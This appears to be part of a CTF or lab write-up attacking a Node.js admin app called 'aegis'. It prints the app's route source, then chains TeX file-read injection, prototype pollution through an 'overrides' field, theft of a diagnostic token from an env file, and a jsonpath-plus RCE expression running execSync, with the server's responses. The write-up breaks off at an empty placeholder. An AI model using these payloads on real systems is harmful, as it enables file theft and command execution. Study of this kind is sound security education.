    'SELECT id, name, scope, owner, version, status, role_tier, modified FROM dbo.templates ORDER BY modified DESC'
  );
  return r.recordset;
}

async function getTemplate(id) {
  const p = sql.getPool();
  const r = await p.request()
    .input('id', sql.sql.NVarChar(64), id)
    .query('SELECT id, name, scope, owner, version, status, role_tier, body, modified FROM dbo.templates WHERE id=@id');
  return r.recordset[0] || null;
}

async function latestDiagnostics(templateId, limit) {
  const p = sql.getPool();
  const r = await p.request()
    .input('id', sql.sql.NVarChar(64), templateId)
    .input('lim', sql.sql.Int, limit || 5)
    .query(`SELECT TOP (@lim) id, status, stage, last_error_msg, last_warnings, artifact_path, duration_ms, triggered_by, created_at FROM dbo.render_diagnostics WHERE template_id=@id ORDER BY created_at DESC`);
  return r.recordset;
}

async function recordDiagnostics(row) {
  const p = sql.getPool();
  await p.request()
    .input('template_id', sql.sql.NVarChar(64), row.template_id)
    .input('triggered_by', sql.sql.NVarChar(64), row.triggered_by || null)
    .input('status', sql.sql.NVarChar(32), row.status)
    .input('stage', sql.sql.NVarChar(32), row.stage || null)
    .input('last_error_msg', sql.sql.NVarChar(sql.sql.MAX), row.last_error_msg || null)
    .input('last_warnings', sql.sql.NVarChar(sql.sql.MAX), row.last_warnings || null)
    .input('artifact_path', sql.sql.NVarChar(400), row.artifact_path || null)
    .input('duration_ms', sql.sql.Int, row.duration_ms || null)
    .query(`INSERT INTO dbo.render_diagnostics (template_id, triggered_by, status, stage, last_error_msg, last_warnings, artifact_path, duration_ms) VALUES (@template_id, @triggered_by, @status, @stage, @last_error_msg, @last_warnings, @artifact_path, @duration_ms)`);
}

const SAMPLE_REQUEST = {
  id: 'SR-2026-04-1182',
  artifact: 'kernel-driver-nvtsec.sys',
  submitter: 'a.holm',
  pipeline: 'driver-attest-v3',
  risk: 'HIGH',
  submitted: '2026-04-30T08:14:22Z',
};

const SAMPLE_PIPELINE = {
  id: 'firmware-bls',
  defaults: {
    audience: 'internal',
    ceremony_witness: 's.vrana'
  }
};

const SAMPLE_ARTIFACT = {
  lineage: ['build-runner-04 / job 18429', 'src-tag refs/tags/release/2.18', 'compiler clang-19.1.2 (-O2 -fstack-protector-strong)'],
  size: '4.1 MB',
  compiler: 'clang-19.1.2',
};

function spawnWorker(jobDir) {
  return new Promise((resolve) => {
    // Sov-Sec-19 (r.kova, 2026-05-13): pass an explicit minimal env so that a
    // polluted Object.prototype cannot inject vars (e.g. NODE_OPTIONS) into
    // the child via prototype-chain fallback when spawn reads options.env.
    // Sudo's env_reset would normally strip these, but we don't want to rely
    // on the sudoers defaults staying intact.
    const child = spawn('/usr/bin/sudo', ['-n', '-u', RENDER_USER, '/usr/bin/node', RENDER_WORKER, jobDir], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: {
        PATH: '/usr/bin:/bin',
        LANG: 'C.UTF-8'
      },
    });

    let out = '', err = '';
    child.stdout.on('data', (d) => { out += d.toString('utf8'); });
    child.stderr.on('data', (d) => { err += d.toString('utf8'); });

    const timer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch (_) {}
    }, RENDER_TIMEOUT_MS);

    child.on('close', (code) => {
      clearTimeout(timer);
      resolve({ code, out, err });
    });
  });
}

router.get('/admin/templates', requireAdmin, async (req, res) => {
  try {
    const templates = await listTemplates();
    res.render('admin/templates.njk', {
      pageTitle: 'Notice Templates',
      templates
    });
  } catch (e) {
    console.error('templates list error', e);
    res.status(500).send('templates error');
  }
});

router.get('/admin/templates/:id', requireAdmin, async (req, res) => {
  try {
    const tpl = await getTemplate(req.params.id);
    if (!tpl) {
      return res.status(404).render('error.njk', {
        code: 404,
        title: 'Template Not Located',
        detail: 'No such template id.'
      });
    }
    const diagnostics = await latestDiagnostics(tpl.id, 5);
    res.render('admin/template_edit.njk', {
      pageTitle: tpl.id,
      tpl,
      samplePipeline: SAMPLE_PIPELINE.id,
      sampleRequest: SAMPLE_REQUEST,
      diagnostics,
    });
  } catch (e) {
    console.error('templates edit error', e);
    res.status(500).send('templates error');
  }
});

router.post('/admin/templates/:id/save', requireAdmin, async (req, res) => {
  try {
    const tpl = await getTemplate(req.params.id);
    if (!tpl) return res.status(404).json({ ok: false, error: 'no such template' });

    const body = String((req.body && req.body.body) || '');
    const p = sql.getPool();
    await p.request()
      .input('id', sql.sql.NVarChar(64), tpl.id)
      .input('body', sql.sql.NVarChar(sql.sql.MAX), body)
      .input('version', sql.sql.Int, tpl.version + 1)
      .query('UPDATE dbo.templates SET body=@body, version=@version, modified=SYSUTCDATETIME() WHERE id=@id');

    res.json({ ok: true, version: tpl.version + 1 });
  } catch (e) {
    console.error('templates save error', e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

router.post('/admin/templates/:id/render', requireAdmin, async (req, res) => {
  let tpl;
  try {
    tpl = await getTemplate(req.params.id);
    if (!tpl) return res.status(404).json({ ok: false, error: 'no such template' });
  } catch (e) {
    return res.status(500).json({ ok: false, error: e.message });
  }

  // Hand the render to the isolated renderer principal.
  const jobId = 'job-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
  const jobDir = path.join(JOB_ROOT, jobId);

  let overrides = {};
  try {
    if (req.body && typeof req.body.overrides === 'string' && req.body.overrides.trim()) {
      overrides = JSON.parse(req.body.overrides);
    } else if (req.body && req.body.overrides && typeof req.body.overrides === 'object') {
      overrides = req.body.overrides;
    }
  } catch (e) {
    return res.status(400).json({ ok: false, error: 'overrides must be valid JSON: ' + e.message });
  }

  const officer = {
    handle: req.session.userHandle || 'admin',
    clearance: 'Δ-5',
    displayName: req.session.userHandle || 'admin',
  };

  const job = {
    templateId: tpl.id,
    body: (req.body && typeof req.body.body === 'string') ? req.body.body : tpl.body,
    request: SAMPLE_REQUEST,
    officer,
    pipeline: SAMPLE_PIPELINE,
    artifact: SAMPLE_ARTIFACT,
    overrides,
  };

  // Write job spec into a tmpdir that aegis-render can read+write. The dir
  // is created by the worker (it has write perms on /var/lib/aegis-render).
  // We pre-stage the spec via a webadmin-writable handoff dir.
  fs.mkdirSync(jobDir, { recursive: true, mode: 0o775 });
  fs.writeFileSync(path.join(jobDir, 'job.json'), JSON.stringify(job));

  // Allow aegis-render to write into the job dir.
  try { fs.chmodSync(jobDir, 0o777); } catch (_) {}

  const proc = await spawnWorker(jobDir);

  let result;
  try {
    result = JSON.parse(fs.readFileSync(path.join(jobDir, 'result.json'), 'utf8'));
  } catch (e) {
    result = {
      ok: false,
      finalStage: 'worker',
      stages: [{ stage: 'worker', code: proc.code, stderr: proc.err || e.message }]
    };
  }

  const lastStage = (result.stages && result.stages.length) ? result.stages[result.stages.length - 1] : null;
  const errMsg = lastStage ? (lastStage.stderr || '').slice(0, 8000) : '';
  const warnings = (result.stages || [])
    .map((s) => s.stage + ': ' + (s.stderr || '').split('\n').slice(0, 5).join('\n '))
    .join('---\n ')
    .slice(0, 16000);

  await recordDiagnostics({
    template_id: tpl.id,
    triggered_by: req.session.userHandle || ('user##' + req.session.userId),
    status: result.ok ? 'OK' : 'FAILED',
    stage: result.finalStage || (lastStage && lastStage.stage),
    last_error_msg: errMsg,
    last_warnings: warnings,
    artifact_path: result.artifactPath || null,
    duration_ms: result.durationMs || null,
  });

  res.json({
    ok: result.ok,
    finalStage: result.finalStage,
    artifactPath: result.artifactPath || null,
    durationMs: result.durationMs,
    stages: (result.stages || []).map((s) => ({
      stage: s.stage,
      code: s.code,
      durationMs: s.durationMs,
      cmd: s.cmd,
      stderr: (s.stderr || '').slice(-40000),
      stdout: (s.stdout || '').slice(0, 1000),
    })),
  });
});

// Backwards-compat: the existing skeleton calls /preview. Treat it as render.
router.post('/admin/templates/:id/preview', requireAdmin, (req, res, next) => {
  req.url = req.url.replace(/\/preview$/, '/render');
  router.handle(req, res, next);
});

module.exports = router;
```
{% endcode %}

1. **The `overrides` are passed directly to the worker** via `job.json` - no merging happens here
2. **The worker script is** `/home/webadmin/aegis/lib/render_worker.js`
3. **The worker runs as** `aegis-render` user via sudo



**For the last one the mds\_diag.js i dont know i cant open it using my payload so i use the basic one**&#x20;

{% code overflow="wrap" %}
```
{
  "body": "\\input{/home/webadmin/aegis/routes/mds_diag.js}",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}
```
{% endcode %}

{% code overflow="wrap" %}
```java
const express = require('express');
const router = express.Router();
const JSONPath = require('jsonpath-plus');
const sql = require('../db/sql');
const getDb = require('../db/mongo');
const profiles = require('../lib/mds_diag_profiles');

const TOKEN = process.env.MDS_DIAG_TOKEN || '';
if (!TOKEN) console.warn("[mds diag] no token loaded; populate /etc/aegis/mds_diag.env to set MDS_DIAG_TOKEN");

const SNAPSHOT_TTL_MS = parseInt(process.env.MDS_DIAG_SNAPSHOT_TTL_MS || 60000, 10);
const EXPR_MAX = 2000;
const RESULT_CAP = 50;

let _snapshot = null;
let _snapshotAt = 0;

async function loadSnapshot() {
  const coll = getDb().collection('mds_entries');
  const entries = await coll.find({}).limit(2000).toArray();
  return { entries, generatedAt: Date.now() };
}

function validateExpr(expr) {
  if (!expr.length) return 'expr must not be empty';
  if (expr.length > EXPR_MAX) return `expr exceeds ${EXPR_MAX} chars`;
  if (!expr.startsWith('$')) return 'expr must start with $';
  return null;
}

router.post('/api/v1/aegis-mds/_diag/:token/jpquery', express.json({ limit: '1mb' }), async (req, res) => {
  if (req.params.token !== TOKEN) return res.status(401).json({ error: 'bad token' });
  
  const { expr, context } = req.body || {};
  const profile = profiles.find(p => p.scope === (context || 'trust'));
  if (!profile) return res.status(400).json({ error: 'unknown context' });
  
  const validationError = validateExpr(expr);
  if (validationError) return res.status(400).json({ error: validationError });
  
  let snapshot = _snapshot;
  const now = Date.now();
  if (!_snapshot || (now - _snapshotAt) > SNAPSHOT_TTL_MS) {
    snapshot = await loadSnapshot();
    _snapshot = snapshot;
    _snapshotAt = now;
  }
  
  if (context === 'trust') return res.json({ generatedAt: snapshot.generatedAt, context, profile: profile.scope, entries: snapshot.entries });
  
  let matches = [];
  let status = 'ok';
  try {
    matches = JSONPath.JSONPath({ path: expr, json: snapshot.entries, ...DEFAULT_JP_OPTS });
  } catch (e) {
    status = 'error';
    errorDetail = e && e.message ? e.message : String(e);
  }
  
  // Audit logging to MSSQL
  try {
    const pool = sql.getPool();
    await pool.request()
      .input('ctx', sql.sql.NVarChar(64), context)
      .input('expr', sql.sql.NVarChar(sql.sql.MAX), expr.slice(0, EXPR_MAX))
      .input('rcount', sql.sql.Int, matches.length)
      .input('stat', sql.sql.NVarChar(16), status)
      .input('caller', sql.sql.NVarChar(64), (req.ip || '').slice(0, 64))
      .query(`INSERT INTO dbo.mds_diag_audit (ts, context, expr, result_count, status, caller) VALUES (SYSUTCDATETIME(), @ctx, @expr, @rcount, @stat, @caller)`);
  } catch (_) { /* best-effort */ }
  
  return res.json({
    generatedAt: snapshot.generatedAt,
    context,
    profile: profile.scope,
    matchCount: matches.length,
    matches: matches.slice(0, RESULT_CAP),
  });
});

module.exports = router;
```
{% endcode %}

### Critical Vulnerability: JSONPath RCE&#x20;

**The endpoint `/api/v1/aegis-mds/_diag/:token/jpquery` uses `jsonpath-plus` library, which has a known Remote Code Execution vulnerability through crafted JSONPath expressions.**<br>

**so first we extract the token we have the path**&#x20;

{% code overflow="wrap" %}
```
{
  "body": "\\newread\\file \\openin\\file=/etc/aegis-mds-diag.env \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}

MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded
```
{% endcode %}

**we will exploiting the unsafe default usage of `eval='safe'` mode**

**so we send a post request on this endpoit**  /api/v1/aegis-mds/\_diag/bcdf42b953dcee715b8d81e38f0c5ded/jpquery

{% code overflow="wrap" %}
```
{
  "expr": "$[?(@.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString())]",
  "context": "audit"
}

{"error":"UnknownContext","detail":"No diagnostic profile registered for context 'audit'.","contexts":["registration","metadata","trust"]}
```
{% endcode %}

{% code overflow="wrap" %}
```
{
  "expr": "$[?(@.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString())]",
  "context": "metadata"
}

{"error":"JpQueryFailure","detail":"jsonPath: Cannot read properties of 2026-07-03T19:48:39.958Z (reading 'constructor'): @.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()"}
```
{% endcode %}

**so to have a better let's search the exact version of jsonpath +**

{% code overflow="wrap" %}
```
{
  "body": "\\newread\\file \\openin\\file=/home/webadmin/aegis/package.json \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}



=\\read2\n! { \"name\": \"aegis\", \"version\": \"0.1.0\", \"private\": true, \"main\": \"server.js\", \"scripts\": { \"start\": \"node server.js\", \"dev\": \"node --watch server.js\" }, \"dependencies\": { \"@simplewebauthn/server\": \"^10.0.1\", \"express\": \"^4.21.0\", \"express-session\": \"^1.19.0\", \"jsonpath-plus\": \"^10.2.0\", \"mongodb\": \"^7.2.0\", \"mssql\": \"^12.5.0\", \"nunjucks\": \"^3.2.4\" } } .\n\\iterate ...\\file to\\myline \\errmessage {\\myline }
```
{% endcode %}

**CVE-2025-1302**

{% code overflow="wrap" %}
```
// Some code
```
{% endcode %}

<br>
